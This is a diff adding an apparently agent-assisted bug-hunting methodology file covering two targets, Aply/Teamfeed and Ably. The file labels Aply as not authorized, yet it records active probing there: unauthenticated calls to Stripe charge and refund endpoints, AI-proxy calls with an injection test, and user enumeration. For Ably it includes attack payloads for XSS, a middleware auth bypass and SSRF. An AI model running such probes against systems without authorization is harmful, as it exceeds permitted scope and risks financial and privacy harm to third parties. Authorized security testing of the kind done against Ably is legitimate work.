@@ -1,0 +1,239 @@
+================================================================================
+FULL HUNT STEPS / METHODOLOGY (reproducible)
+================================================================================
+Date: 2026-11-18
+Targets: A) aply.com / teamfeed.co   B) ably.com
+Secrets: REDACTED (replace placeholders locally; never commit real keys)
+
+Legend: [P]=passive  [A]=active (only where authorized)  [!]=do not run
+        against real user data / real applicationId
+
+================================================================================
+A. APLY / TEAMFEED  (NOT AUTHORIZED - no program; passive/code review only)
+================================================================================
+A.1 Scope/authorization check
+  - Search platforms for a program:
+      HackerOne: lookups for aply, aplyhq, teamfeed, aply-com, aplycom,
+                 aplyco -> "Team does not exist"
+      Bugcrowd / YesWeHack: no matching program
+      disclose.io directory: no Aply entry
+  - security.txt / security pages = SPA catch-all (not real)
+  - Conclusion: NO program, NO authorization, NO payout. Do not exploit.
+
+A.2 Historical recon (STALE) note
+  - /home/its/Agentic-Bug-Hunter/bughunter/recon/aply.com/ is Wayback-era;
+    r= param decodes to ask.com parked syndication. Not the live app.
+
+A.3 DNS / subdomains [P]
+  crt.sh:  curl -sS "https://crt.sh/?q=%25.aply.com&output=json"
+  DoH:     curl -sS -H 'Accept: application/dns-json' \
+             "https://cloudflare-dns.com/dns-query?name=<host>&type=A"
+  Resolved: aply.com/www/internal (Firebase), links.aply.com (CloudFront->
+  Resend), pay.aply.com (GoDaddy), teamfeed-server/aply-server (Render).
+
+A.4 HTTP fingerprint [A-minimal]
+  curl -sS -D - -o /dev/null https://aply.com/
+  curl -sS -D - -o /dev/null https://aply.com/login   (title "Login | Ably"? no, Aply)
+  Note: SPA catch-all returns 200 index.html for every path.
+
+A.5 Front-end source review [P]
+  curl -sS https://aply.com/assets/index-<hash>.js -o aply.js
+  grep -oaE '"assets/[^"]+\.js"' aply.js | tr -d '"' | sort -u   # chunk list
+  # download every chunk:
+  while read p; do curl -sS "https://aply.com/$p" -o "chunks/$(basename $p)"; done
+  # extract endpoints/config/collections/secrets:
+  grep -hoaE '`?/(api|v1|v2)/[a-zA-Z0-9_/${}.:-]{2,70}' chunks/*.js | sort -u
+  grep -hoaE '(apiKey|authDomain|projectId|storageBucket):"[^"]+"' chunks/*.js
+  grep -oaE 'sourceMappingURL=[^ ]+' aply.js          # none
+
+A.6 Firebase config discovered (public by design)
+  project mrkt-2efde; apiKey AIzaSy... (public); storageBucket
+  mrkt-2efde.appspot.com; databaseURL mrkt-2efde-default-rtdb.firebaseio.com
+
+A.7 Data-store checks (unauthenticated) [P]
+  Firestore: https://firestore.googleapis.com/v1/projects/mrkt-2efde/databases/(default)/documents/<coll>?pageSize=1
+     -> 403 for all tested collections
+  RTDB:      https://mrkt-2efde-default-rtdb.firebaseio.com/.json  -> 403
+  Storage:   https://firebasestorage.googleapis.com/v0/b/mrkt-2efde.appspot.com/o -> 403
+             https://storage.googleapis.com/mrkt-2efde.appspot.com/ -> AccessDenied
+
+A.8 Endpoint discovery on teamfeed-server [A]
+  # status differential (401 = exists/auth, 404 = none):
+  curl -sS -o /dev/null -w '%{http_code}' -H 'Authorization: Bearer x' \
+       https://teamfeed-server.onrender.com/api/me
+  # discovered: /api/me,/api/companies,/api/companies/:id,/api/groups/context,
+  #   /api/groups/ensure,/api/groups/:id/roster,/api/groups/:id/members/:uid,
+  #   /api/workspace/:id/{catalog,entitlements},/api/invites/:t,
+  #   /api/collab/invites/:t,/api/demo-shares/:id,/api/company-categories,
+  #   /api/stripe/*,/api/ai is on aply-server.
+  # empty-body POST differential to find routes with NO auth middleware:
+  for p in <list>; do curl -sS -o /dev/null -w '%{http_code}\n' -X POST \
+      -H 'Content-Type: application/json' -d '{}' "https://teamfeed-server.onrender.com$p"; done
+  # RESULT: only /api/stripe/create-checkout-session lacked auth (400 Missing pipelineId)
+
+A.9 CONFIRMED: unauth Stripe endpoints (SAFE - bogus id only) [A]
+  Z=00000000-0000-0000-0000-000000000000
+  for ep in accept-no-charge charge-balance refund-deposit; do
+    curl -sS -X POST -H 'Content-Type: application/json' \
+      -d "{\"applicationId\":\"$Z\"}" \
+      "https://teamfeed-server.onrender.com/api/stripe/$ep"
+  done
+  # -> 404 {"error":"Application not found"}  (NO 401 => no auth)
+  # create-checkout-session:
+  curl -sS -X POST -H 'Content-Type: application/json' \
+    -d '{"pipelineId":"zzz","applicationData":null,"returnUrl":null}' \
+    https://teamfeed-server.onrender.com/api/stripe/create-checkout-session
+  # -> 400 {"error":"Unsupported pipeline"} (no auth)
+  ![!] DO NOT reuse with a real applicationId -> that is a financial action.
+
+A.10 CONFIRMED: unauth AI proxy [A-benign]
+  for i in 1 2 3; do curl -sS -X POST -H 'Content-Type: application/json' \
+    -d "{\"name\":\"probe $i\"}" https://aply-server.onrender.com/ai/enrich-company; done
+  # -> 200 x3 (no auth, no rate limit)
+  # injection test (benign text) -> model refused; no system-prompt leak
+
+A.11 CONFIRMED: Firebase user enumeration [A-benign]
+  K=AIzaSy...   # public web key
+  curl -sS -H 'Content-Type: application/json' \
+    -d '{"identifier":"zz-nonexistent@example.invalid","continueUri":"https://aply.com/"}' \
+    "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=$K"
+  # -> {"registered":false,...}
+  # sendOobCode (PASSWORD_RESET) -> EMAIL_NOT_FOUND
+  # signInWithPassword -> EMAIL_NOT_FOUND vs INVALID_PASSWORD
+
+A.12 Code-evidenced (NOT validated; need auth + Firestore rules)
+  - Pipeline chunk: setDoc(doc(db,"Applications",`${Op(email)}_${pipelineId}`),
+      {paymentStatus:"balance_paid", decisionStatus:"active", ...},{merge:true})
+  - Admin allowlist in client: ["nd@aply.com"]; role:"leadership"/isAdmin
+    written client-side.
+  - Op = email.toLowerCase().replace(/[^a-z0-9]+/g,"_")  (predictable doc id)
+  - To validate safely: create a TEST account, use test data only, inspect
+    whether rules allow writing paymentStatus/decisionStatus / reading others.
+
+A.13 Infra/DNS [P]
+  TXT aply.com: hosting-site=mrkt-2efde; firebase=mrkt-2efde; SPF zoho+firebase
+  MX: Zoho. DMARC: p=none. CAA: none.
+  links.aply.com -> links2.resend-dns.com (Resend click tracking)
+  pay.aply.com -> paylinks.commerce.godaddy.com
+
+================================================================================
+B. ABLY  (AUTHORIZED - VDP; https://ably.com/disclosure; disclosure@ably.com)
+================================================================================
+B.0 Scope (from policy)
+  IN: ably.com, ancillary *.ably.com (operated by Ably, not internal),
+      control.ably.net, main.realtime.ably.net, realtime.ably.io, rest.ably.io,
+      *.realtime.ably.net, *-realtime.ably.io, *-rest.ably.io,
+      *.ably-realtime.com, customer CNAMEs.
+  OUT: SDKs, ably-cli/ably-server, third-party (Intercom, support.ably.com,
+      SafeBase security.ably.com, HubSpot pages, status.ably.com),
+      internal/non-customer-facing (incl. ai-assistant.ably.com).
+  EXCLUDED: user enum, SPF/DMARC, TLS/headers, abstract open redirect/CSRF,
+      DoS/brute force, version disclosure.
+  Payouts: Low=recognition, Medium=$500, High=$1,000, Critical=$3,000.
+
+B.1 Recon [P]
+  crt.sh: curl -sS "https://crt.sh/?q=ably.com&output=json"
+  DoH brute: for s in api app dashboard control rest realtime main www docs ...; do
+     curl -sS -H 'Accept: application/dns-json' \
+       "https://cloudflare-dns.com/dns-query?name=$s.ably.com&type=A"; done
+  Security: curl -sS https://ably.com/.well-known/security.txt
+            curl -sS https://ably.com/robots.txt
+
+B.2 HTTP fingerprint [A]
+  curl -sS -D - -o /dev/null https://ably.com/
+  curl -sS -D - -o /dev/null https://control.ably.net/
+  curl -sS -D - -o /dev/null https://rest.ably.io/
+  curl -sS -D - -o /dev/null https://main.realtime.ably.net/
+  # /time -> 200 ; /channels,/stats -> 401 ; control routes auth-gated
+
+B.3 Subdomain takeover [P]
+  # resolve each *.ably.com and follow CNAME chain; flag NXDOMAIN target
+  # RESULT: no dangling (Vercel/CloudFront/HubSpot/SafeBase/Statuspage all live)
+
+B.4 Exposed files / XSS [A]
+  for p in /.git/HEAD /.env /config/database.yml /backup.sql /manifest.json; do
+    curl -sS -o /dev/null -w '%{http_code}\n' "https://ably.com$p"; done  # all 404
+  curl -sS --get --data-urlencode 'q="><svg/onload=alert(1)>' https://ably.com/search
+  # no reflection
+
+B.5 Next.js middleware auth-bypass (CVE-2025-29927) [A]
+  curl -sS -o /dev/null -w '%{http_code} %{redirect_url}\n' \
+    -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' \
+    https://dashboards-external.ably.com/
+  # -> 307 /login (PATCHED)
+
+B.6 SSRF - image optimizer [A]
+  curl -sS "https://ably.com/_next/image?url=$(python3 -c 'import urllib.parse;print(urllib.parse.quote("http://169.254.169.254/latest/meta-data/",safe=""))')&w=64&q=75"
+  # -> no optimizer / rejected
+
+B.7 Authenticated authz testing (own app; tokens from account owner) [A]
+  # Account token (REDACTED; revoke after):
+  T='<ACCOUNT_TOKEN>'
+  GET /v1/me                         # shows token caps
+  GET /v1/apps/<APP>/keys            # owner can read keys
+  GET /v1/apps/zzzzzz/keys           # -> 404 (tenant isolation)
+  GET /v1/accounts/<ACC>/apps        # -> 401 (no read:app cap)
+  # Capability bounding: mint token from a subscribe-only key requesting publish
+  curl -u '<APP>.<SUBKEY>:<SECRET>' -X POST \
+    --data-urlencode 'clientId=t' --data-urlencode "timestamp=$(date +%s%3N)" \
+    --data-urlencode 'ttl=3600000' --data-urlencode 'keyName=<APP>.<SUBKEY>' \
+    --data-urlencode 'capability={"*":["publish","subscribe"]}' \
+    https://rest.ably.io/keys/<APP>.<SUBKEY>/requestToken
+  # -> capability CAPPED to {"*":["subscribe"]}
+  # Channel isolation: token for chanA -> publish chanA 201, chanB 401
+
+B.8 Token revocation (REST) [A]
+  # needs key with revocableTokens=true
+  POST /keys/<APP>.<KEY>/revokeTokens  {"targets":["clientId:<cid>"]}   -> 201
+  # after appliesAt: publish -> 401 (ENFORCED)
+  # malformed targets -> 500 (unhandled; informational only)
+
+B.9 Integration-rules SSRF [A - validation only, no trigger]
+  POST /v1/apps/<APP>/rules {"ruleType":"http","requestMode":"single",
+    "source":{"channelFilter":"zz","type":"channel.message"},
+    "target":{"url":"http://127.0.0.1/","format":"json","enveloped":false}}
+  # -> 422 {"details":{"base":["Disallowed IP address"]}}
+  # bypass attempts (2130706433,0x7f000001,127.1,nip.io,[::ffff:...]) -> 422
+  # example.com@127.0.0.1 -> 201 (host=example.com, correct)
+  # DELETE the rule afterwards
+
+B.10 Signed TokenRequest escalation [A]
+  # Spec: server verifies requested capability against key capability and may
+  # subset. -> No escalation by design.
+
+B.11 Realtime protocol (Node 22 WebSocket, protocol v2) [A]
+  ws = new WebSocket(`wss://realtime.ably.io/?accessToken=<tok>&format=json&v=2`)
+  # CONNECTED action 4; ATTACH action 10 -> ATTACHED 11;
+  # MESSAGE action 15 {channel,msgSerial,messages} -> ACK action 1
+  # revoke token mid-connection -> server closes (1000); publish not ACKed
+  # => revocation enforced on live connections
+
+B.12 Realtime token expiry (short TTL) [A - optional]
+  mint token ttl=2000ms, connect, wait > expiry, publish -> expect error/close
+
+B.13 Cleanup
+  POST /v1/apps/<APP>/keys/<ID>/revoke   (temporary keys -> status=1)
+  DELETE /v1/apps/<APP>/rules/<ID>
+  rm local token/key files
+
+================================================================================
+C. EVIDENCE / POC GUIDANCE
+================================================================================
+- Server-side bugs: raw HTTP transcript (request+response) is the strongest PoC.
+- Auth/logic/IDOR: video of before->action->after with a TEST account; blur PII.
+- Never demonstrate financial actions against real applicationId; use bogus IDs.
+- Ably: main details in email body, screenshots/video as attachments, include
+  reproducible steps; first valid report wins.
+- Aply: no program -> responsible disclosure only (hello@aply.com /
+  hello@teamfeed.com). Do not publish.
+
+================================================================================
+D. RESULTS SUMMARY
+================================================================================
+Aply (unauthorized): 1 Critical (unauth Stripe), 1 Medium (AI proxy),
+  1 Low (user enum), 1 Low (public endpoints); several code-evidenced leads.
+Ably (authorized): 0 confirmed bugs (all tested classes enforced/fixed).
+
+================================================================================
+END
+================================================================================
